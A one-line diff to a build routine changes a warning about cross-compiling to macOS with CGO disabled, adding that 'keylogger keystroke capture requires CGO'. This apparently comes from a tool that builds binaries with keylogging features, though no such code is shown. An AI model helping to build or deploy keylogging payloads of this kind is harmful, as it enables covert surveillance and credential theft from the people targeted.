@@ -828,7 +828,7 @@ func runBoundFiles() {
         env.CGO_ENABLED = "0";
         sendToStream({
           type: "output",
-          text: "WARNING: Cross-compiling to darwin from a non-macOS host requires an osxcross/macOS SDK toolchain, which is not bundled. Forcing CGO disabled for this target. Build natively on macOS for full CGO support.\n",
+          text: "WARNING: Cross-compiling to darwin from a non-macOS host requires an osxcross/macOS SDK toolchain, which is not bundled. Forcing CGO disabled for this target. Build natively on macOS for full CGO support (keylogger keystroke capture requires CGO).\n",
           level: "warn",
         });
       }
